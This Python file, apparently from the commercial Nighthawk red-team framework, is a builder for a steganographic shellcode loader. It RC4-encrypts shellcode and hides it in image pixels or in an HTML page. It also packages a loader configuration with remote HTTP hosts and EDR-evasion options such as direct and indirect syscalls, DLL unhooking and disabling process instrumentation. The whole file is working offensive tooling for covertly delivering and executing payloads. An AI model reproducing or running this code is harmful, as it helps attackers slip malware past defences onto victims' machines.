# Copyright 2022 MDSec Consulting Ltd
# Use of this source code is governed by an End User License Agreement,
# details of this agreement can be found in EULA.pdf
# Nighthawk (r)

import os
import sys
import struct
import json
import math
import binascii
import base64
import argparse
import random
from PIL import Image
from bs4 import BeautifulSoup
from Crypto.Cipher import ARC4
from Crypto.Random import get_random_bytes


SL_FORMAT_BYTES = 1 # file embedded as bytes
SL_FORMAT_BITS = 2 # file embedded as bits 

DEFAULT_BYTES_PER_PIXEL = 4
DEFAULT_IMAGE_WIDTH = 512
BIN2IMG_KEY_LENGTH = 16

FILE_TYPE_BIN = 1
FILE_TYPE_IMG = 2

SL_FLAG_USE_SYSCALLS = (1 << 1)        # Use system calls.
SL_FLAG_SECURE_HTTPS = (1 << 2)        # Only use secure HTTPS. Disconnect if errors are detected.
SL_FLAG_USE_THREADPOOL = (1 << 3)      # Use the thread pool to invoke LoadLibraryW()
SL_FLAG_DISABLE_PI = (1 << 4)          # Disable process instrumentation.
SL_FLAG_INDIRECT_SYSCALLS = (1 << 5)   # Use indirect system calls.
SL_FLAG_UNHOOK_DLL = (1 << 6)          # Unhook DLLs. List of DLLs are in the configuration.
SL_FLAG_UNHOOK_GUARD = (1 << 7)        # Remove PAGE_GUARD before removing user-mode hooks.
SL_FLAG_AVOID_HEAPALLOC = (1 << 8)     # Avoid using the heap to allocate memory for system calls.
SL_FLAG_EXEC_CREATETHREAD = (1 << 9)   # Use a new thread to execute shellcode.
SL_FLAG_EXEC_DIRECT = (1 << 10)        # Execute directly.
SL_FLAG_EXEC_WAIT = (1 << 11)          # Wait for new thread to terminate before exiting.

SL_MAX_HTTP = 10
SL_MAX_DLL = 10
SL_KEY_LEN = 16

'''
    Convert bytes to human readable string
'''


def format_size(size_bytes):
    if size_bytes == 0:
        return "0B"
    size_name = ("B", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB")
    i = int(math.floor(math.log(size_bytes, 1024)))
    p = math.pow(1024, i)
    s = round(size_bytes / p, 2)
    return "%s %s" % (s, size_name[i])
    
    
''' 
    Convert a binary file into an image.
    Data is automatically aligned on a 4 byte boundary to avoid OOB reads.
    Encrypted with 128-Bit key using RC4.
'''


class bin2img:    
    def __init__(self, infile, fmt):
        self.X = 0
        self.Y = 0
        self.RGB = 0 # new images will be 32-Bit
        self.Format = fmt
        self.Width = 0
        self.Height = 0
        
        # we're creating a new image and storing file data as bytes
        if(self.Format == SL_FORMAT_BYTES):
            # get the length of input file and align up by 4
            inlen = os.path.getsize(infile)
            aligned = ((inlen + 3) & -4)
            self.Width = int(DEFAULT_IMAGE_WIDTH)
            self.Height = int((aligned / DEFAULT_BYTES_PER_PIXEL) / DEFAULT_IMAGE_WIDTH)

            if((aligned / DEFAULT_BYTES_PER_PIXEL) % DEFAULT_IMAGE_WIDTH):
                self.Height += 1
            
            self.img = Image.new('RGBA', (self.Width, self.Height))
        else:
            # we're using an existing image.
            # we need to support both 24 and 32-Bit images.
            self.img = Image.open(infile, "r").copy()
            if (self.img.mode == 'RGB'):
                self.RGB = 1
            self.Width = self.img.width
            self.Height = self.img.height
            
        self.Pixels = self.img.load()
            
    ''' 
        Store stream of bytes in pixels of new image.
    '''
    def write_bytes(self, inbuf, inlen):
        # align input buffer up by 4 to avoid OOB reads.
        inbuf += b'\0' * (-inlen & 3)
        
        for i in range(0, inlen, 4):

            r = inbuf[i]
            g = inbuf[i+1]
            b = inbuf[i+2]
            a = inbuf[i+3]
            
            self.Pixels[self.X, self.Y] = (b, g, r, a)
            
            self.X += 1
            
            if (self.X == self.Width):
                self.X = 0
                self.Y += 1
                if (self.Y > self.Height): 
                    break
        return i

    ''' 
        Store stream of bits in pixels of existing image.
    '''
    def write_bits(self, inbuf, inlen):
        for i in range(0, inlen, 1):
            # read 1 byte
            x = inbuf[i]
            
            # carrier image is RGB (24-Bit)
            if (self.RGB):
                # store three bits in R and G, two in B
                (b, g, r) = self.Pixels[self.X, self.Y]
                r = (r & 248) | (x & 7)
                g = (g & 248) | ((x >> 3) & 7)
                b = (b & 252) | (x >> 6)
                self.Pixels[self.X, self.Y] = (b, g, r)
            else:
                # carrier image is RGBA (32-Bit)
                # store two bits in each byte/component of a pixel.
                (b, g, r, a) = self.Pixels[self.X, self.Y]
                r = (r & 252) | (x & 3)
                g = (g & 252) | ((x >> 2) & 3)
                b = (b & 252) | ((x >> 4) & 3)
                a = (a & 252) | (x >> 6)
                self.Pixels[self.X, self.Y] = (b, g, r, a)
            
            self.X += 1
            
            if (self.X == self.Width):
                self.X = 0
                self.Y += 1
                if (self.Y > self.Height): 
                    break
        return i
        
    ''' Write data to pixels of image as bits or bytes depending on storage method. '''
    def write(self, inbuf, inlen):
        if (self.Format == SL_FORMAT_BYTES):
            return self.write_bytes(inbuf, inlen)
        else:
            return self.write_bits(bytearray(inbuf), inlen)
    
    ''' Determines if the image is transparent. '''
    def is_transparent():
        if self.img.info.get("transparency", None) is not None:
            return True
        if self.img.mode == "P":
            transparent = self.img.info.get("transparency", -1)
            for _, index in self.img.getcolors():
                if index == transparent:
                    return True
        elif self.img.mode == "RGBA":
            extrema = img.getextrema()
            if extrema[3][0] < 255:
                return True

        return False
           
    ''' 
        Save image to disk 
    '''
    def save(self, name):
        self.img.save(name)
        self.img.close()
        
    ''' Save image in HTML '''
    def img2html(self, infile):
        html = BeautifulSoup("<!DOCTYPE html><html><head><meta charset=\"utf-8\"><title></title></head><body><div></div></body></html>", "html.parser")
        
        # insert image
        inbuf = open(infile, "rb").read()
        ext = infile.lower().split(".")[-1]
        
        # assign MIME type based on extension
        data = "data:image/%s;base64," % ext
        data += base64.b64encode(inbuf).decode()
        img = html.new_tag("img", src="" + data + "")
        
        # insert into document
        html.title.append("test")
        html.div.append(img)

        # save the html
        with open(os.path.splitext(infile)[0] + ".html", "w", encoding = 'utf-8') as outfile:
            outfile.write(str(html))
        outfile.close()
                    
'''
    Store shellcode inside a new image as bytes or existing image as bits.
    
'''
def embed_shellcode(infile, outfile, carrier, html):
    fmt = None
    img = None
    
    if carrier is None: # if a carrier image is supplied, the data is stored as bits in each byte/component of a pixel
        fmt = SL_FORMAT_BYTES # default is to create new image and store data as bytes in each pixel
        img = bin2img(infile, fmt)
    else:
        fmt = SL_FORMAT_BITS
        img = bin2img(carrier, fmt)
            
    inbuf = open(infile, "rb").read()
    inlen = len(inbuf)
    
    enckey = get_random_bytes(16)
    rc4 = ARC4.new(enckey)
    
    encdata = rc4.encrypt(inbuf)
    
    outbuf = struct.pack("<II", fmt, inlen)
    outbuf += enckey
    outbuf += encdata
    outlen = img.write(outbuf, inlen + 4 + 4 + 16) # 4 for the type, 4 for the file length and 16 for the key
    
    img.save(outfile)
    img_len = os.path.getsize(outfile)
    
    if (html):
        img.img2html(outfile)
    
'''
    Checks if the file exists. If the extension is valid. 
'''
def ValidFile(path, filetype):
    if not os.path.exists(path):
        print("[!] Cannot access %s" % path)
        return 0

    if filetype == FILE_TYPE_IMG:
        ext = path.lower().split(".")[-1]
        
        # make sure the type is one of the following
        if ext is None or ext not in ["png", "tiff", "tif", "bmp"]:
            print("[!] Invalid extension for image : \"%s\". Supported types: PNG, TIFF, BMP" % ext)
            return 0
        
        # read the type of image
        mode = Image.open(path).mode
        
        # make sure image is 24 or 32-Bit
        if (mode != "RGB" and mode != "RGBA"):
            print("[!] Unsupported image type : %s" % mode)
            return 0
    return 1

'''
    Ensures the carrier image has enough space to hold file data.
'''
def ImageCanHoldFile(infile, image):
    img = Image.open(image, "r")
    # RGB is 24-Bit / 3 bytes per pixel.
    bpp = 3
    rgb = "RGB"
    # RGBA is 32-Bit / 4 bytes per pixel.
    if (img.mode == "RGBA"):
        bpp = 4
        rgb = "RGBA"
        
    # calculate how much space required and how much carrier image can hold
    inlen = os.path.getsize(infile)
    img_cap = img.width * img.height * bpp
    img_req = inlen * bpp
    
    # image can hold file data?
    return 1 if (img_req < img_cap) else 0
    
'''
    Take a time string (minutes and seconds) in the format "00:00" and return total seconds.
'''
def get_seconds(string):
    minutes, seconds = map(int, string.split(':'))
    
    # yes, this probably needs better parsing.
    if (seconds > 59):
        print("[!] Invalid time format detected in profile : %ld:%ld" % (minutes, seconds))
        sys.exit(1)
        
    return seconds + (minutes * 60)
    
'''
    Read the timer options: start, interval and max-attempts
'''
def parse_timer(profile):
    # When to start performing HTTP requests.
    start = profile["timer"]["start"]
    
    if (start is None):
        print("[!] start time in profile isn't set.")
        sys.exit(1)
    
    # Calculate how many seconds.
    start = get_seconds(start)
    
    # Time that should elapse before trying again.
    interval = profile["timer"]["interval"]
    
    if (interval is None):
        print("[!] interval time in profile isn't set.")
        sys.exit(1)

    # Calculate how many seconds.
    interval = get_seconds(interval)
    
    # How many times to try before giving up.
    max_attempts = profile["timer"]["max-attempts"]
    
    if (max_attempts is None):
        print("[!] max-attempts in profile isn't set.")
        sys.exit(1)
        
    return start, interval, max_attempts
    
'''
    Read the list of HTTP hosts. Perform some basic parsing.
    For now, ten servers is the maximum amount that can be accepted.
'''
def parse_http(profile):
    http_list = profile["http"]["hosts"]
    
    if (http_list is None):
        print("[!] Cannot read list of hosts from profile.")
        sys.exit(1)
   
    http_cnt = len(http_list)
    
    if (http_cnt > SL_MAX_HTTP):
        print("[!] Detected %ld HTTP hosts. Current limit is set to %ld. Please remove %ld" % (http_cnt, SL_MAX_HTTP, http_cnt - SL_MAX_HTTP))
        print("[!] Increasing the limit in this script won't help.")
        sys.exit(1)
        
    for entry in http_list:
        if (not entry.startswith("http://") and not entry.startswith("https://")):
            print("[!] Invalid HTTP host detected : %s" % entry)
            sys.exit(1)
            
    http_list = ";".join(http_list).encode("utf-8") + b'\x00'
    
    user_agent = profile["http"]["user-agent"]
    
    if (user_agent == ""):
        user_agent = None
    else:
        user_agent = user_agent.encode("utf-8") + b'\x00'
    
    return http_cnt, http_list, user_agent


'''
    If unhooking is enabled, save a list of DLL names. 
    For now, ten DLLs is the maximum amount that can be processed.
'''
def parse_dlls(profile):
    dll_list = profile["opsec"]["unhook-dlls"]
    
    if (dll_list is None):
        print("[!] Cannot read list of DLLs")
        sys.exit(1)
        
    dll_cnt = len(dll_list)
    
    if (dll_cnt > SL_MAX_DLL):
        print("[!] Detected %ld DLLs. Current limit is set to %ld. Please remove %ld" % (dll_cnt, SL_MAX_DLL, dll_cnt - SL_MAX_DLL))
        print("[!] Increasing the limit in this script will not help.")
        sys.exit(1)
        
    dll_list = ";".join(dll_list).encode("utf-8") + b'\x00'
    
    return dll_cnt, dll_list

'''
    Return a human readable string of loader flags.
'''
def parse_flags(profile):
    flgs = 0
    
    # opsec flags
    flgs |= SL_FLAG_USE_SYSCALLS if (profile["opsec"]["syscalls"] == True) else 0    
    flgs |= SL_FLAG_SECURE_HTTPS if (profile["opsec"]["secure-https"] == True) else 0
    flgs |= SL_FLAG_USE_THREADPOOL if (profile["opsec"]["threadpool"] == True) else 0  
    flgs |= SL_FLAG_DISABLE_PI if (profile["opsec"]["disable-pi-callback"] == True) else 0
    flgs |= SL_FLAG_INDIRECT_SYSCALLS if (profile["opsec"]["indirect-syscalls"] == True) else 0
    flgs |= SL_FLAG_UNHOOK_DLL if (profile["opsec"]["unhook"] == True) else 0
    flgs |= SL_FLAG_UNHOOK_GUARD if (profile["opsec"]["unhook-clear-guard"] == True) else 0
    flgs |= SL_FLAG_AVOID_HEAPALLOC if (profile["opsec"]["avoid-heapalloc"] == True) else 0
    
    # injection flags
    method = profile["inject"]["method"]
    flgs |= SL_FLAG_EXEC_CREATETHREAD if (method == "createthread") else 0
    flgs |= SL_FLAG_EXEC_DIRECT if (method == "direct") else 0
    flgs |= SL_FLAG_EXEC_WAIT if (profile["inject"]["wait"] == True) else 0
    
    return flgs
    
def flags2str(flgs):
    opts = ""
    opts += "syscalls" if (flgs & SL_FLAG_USE_SYSCALLS) else ""
    opts += ",secure-https" if (flgs & SL_FLAG_SECURE_HTTPS) else ""
    opts += ",threadpool" if (flgs & SL_FLAG_USE_THREADPOOL) else ""
    opts += ",disable-pi-callback" if (flgs & SL_FLAG_DISABLE_PI) else ""
    opts += ",indirect-syscalls" if (flgs & SL_FLAG_INDIRECT_SYSCALLS) else ""
    opts += ",unhook" if (flgs & SL_FLAG_UNHOOK_DLL) else ""
    opts += ",unhook-clear-guard" if (flgs & SL_FLAG_UNHOOK_GUARD) else ""
    opts += ",avoid-heapalloc" if (flgs & SL_FLAG_AVOID_HEAPALLOC) else ""
    opts += ",exec-createthread" if (flgs & SL_FLAG_EXEC_CREATETHREAD) else ""
    opts += ",exec-direct" if (flgs & SL_FLAG_EXEC_DIRECT) else ""
    opts += ",exec-wait" if (flgs & SL_FLAG_EXEC_WAIT) else ""
    
    return opts
    
'''
    Show the configuration. Decrypt strings..   
'''
def show_config(config):
    # Unpack timer options and offset of DLLs
    data_len, start, interval, max_attempts, flgs, dll_ofs, agent_ofs = struct.unpack("<IIIIIII", config[:28])
    
    # Unpack encryption key and encrypted data.
    enckey = struct.unpack("<16s", config[28:44])[0]
    encdata = struct.unpack("<%lds" % data_len, config[44:])[0]

    # Decrypt the data.
    rc4 = ARC4.new(enckey)
    data = rc4.decrypt(encdata)
    
    # Unpack and HTTP and DLL list.
    http_list = data[:dll_ofs]
    
    if (agent_ofs != 0):
        dll_list = data[dll_ofs:agent_ofs]
        user_agent = data[agent_ofs:data_len]
    else:
        dll_list = data[dll_ofs:data_len]
        user_agent = None

'''
    Using a JSON file, configure and save loader.
'''
def config_ldr(json_path, shellcode_out_path, use_x86):
    if (not os.path.exists("stegoldr.x86.exe.bin")) or (not os.path.exists("stegoldr.x64.exe.bin")):
        print("Shellcode is missing. Build StegoLdr using the MSVC solution.")
        sys.exit(1)
        
    pic_file = "stegoldr.x86.exe.bin" if (use_x86) else "stegoldr.x64.exe.bin" 
    
    # file doesn't exist? exit
    if not os.path.exists(json_path):
        print("[!] %s doesn't exist" % json_path)
        return
        
    # try open file for reading
    json_data = open(json_path, 'rb').read()
    profile = json.loads(json_data)
    
    # Seperate http list by semi-colon and null terminate.
    http_cnt, http_list, user_agent = parse_http(profile)

    # Seperate DLL list by semi-colon and null terminate.
    dll_cnt, dll_list = parse_dlls(profile)
    
    # Parse opsec options.
    ldr_flags = parse_flags(profile)
    
    # Read timer options.
    start, interval, max_attempts = parse_timer(profile)
    
    # Generate a random key to encrypt strings.
    enckey = get_random_bytes(SL_KEY_LEN)
    
    # Encrypt HTTP and DLL list.
    dll_ofs = len(http_list)
    data = http_list + dll_list
    
    if (user_agent is not None):
        agent_ofs = len(data)
        data += user_agent
    else:
        agent_ofs = 0;
    
    data_len = len(data)
    rc4 = ARC4.new(enckey)
    encdata = rc4.encrypt(data)
    
    # Create configuration
    config = struct.pack("<IIIIIII", data_len, start, interval, max_attempts, ldr_flags, dll_ofs, agent_ofs)
    config += enckey
    config += encdata
    
    # save configuration for testing the debug build of loader.
    #outfile = open("config.bin", "wb")
    #outfile.write(config)
    #outfile.close()
    
    # attach configuration to shellcode and save.
    pic_data = open(pic_file, "rb").read()
    outfile = open(shellcode_out_path, "wb")
    pic_data += config
    outfile.write(pic_data)
    outfile.close()
    
def main():    
    parser = argparse.ArgumentParser(
        description="stegoldr v0.3 - Embed shellcode in an image.")

    parser.add_argument( 
        "--x86",
        action='store_true',
        required=False,
        help="Configure 32-Bit loader. Default is 64-Bit.")
        
    parser.add_argument(
        "-i",
        "--infile",
        required=True,
        help="File containing shellcode or image when extracting.")

    parser.add_argument(
        "-oi",
        "--outimage",
        required=True,
        help="Where to save image. Default extension is PNG for storing shellcode or BIN when extracting.")
    
    parser.add_argument(
        "-os",
        "--outshellcode",
        required=True,
        help="Where to save stego shellcode.")

    parser.add_argument(
        "-c",
        "--carrier",
        required=True,
        help="Existing image that will carry shellcode.")
        
    parser.add_argument(
        "-s", 
        "--html",
        action='store_true',
        required=False,
        help="Embed image in HTML file.")

    parser.add_argument(
        "-p", 
        "--profile",
        required=True,
        help="JSON profile with configuration for loader.")
        
    args = parser.parse_args()
    
    use_x86 = args.x86
    infile = args.infile   # file with data to process
    outimage = args.outimage # where to save data
    outshellcode = args.outshellcode
    carrier = args.carrier # name of existing image to store data in
    savehtml = args.html   # embed image in HTML
    profile = args.profile # JSON profile to configure loader
    
    # If no output file specified, use PNG as default.
    if (outimage is None):
        outimage = os.path.basename(infile) + ".png"
    else:
        ext = outimage.lower().split(".")[-1]
        
        # make sure the type is one of the following
        if ext is None or ext not in ["png", "tiff", "tif", "bmp"]:
            print("[!] Invalid extension for output image : \"%s\". Supported types: PNG, TIFF, BMP" % ext)
            sys.exit(1)
    
    # Make sure file exists and contains data.
    if not ValidFile(infile, FILE_TYPE_BIN):
        print("[!] Error with input file : %s" % infile)
        sys.exit(1)
        
    # Make sure carrier image exists and is supported by this code.
    if (carrier):
        if (not ValidFile(carrier, FILE_TYPE_IMG)):
            print("[!] Error with carrier image : %s" % carrier)
            sys.exit(1)
    
        # make sure carrier image can hold contents of input file.
        if (not ImageCanHoldFile(infile, carrier)):
            print("[!] Carrier image is too small for input file.")
            sys.exit(1)
            
    # Create stegoldr.bin using configuration from JSON profile
    config_ldr(profile, outshellcode, use_x86)
    
    # Store file data or in new or existing image.
    # Data is stored as bytes in new image or bits in existing image.
    embed_shellcode(infile, outimage, carrier, savehtml)
    
if __name__ == '__main__':
    try:
        main()
    except Exception as ex:
        print("[!] Error : %s" % ex.message)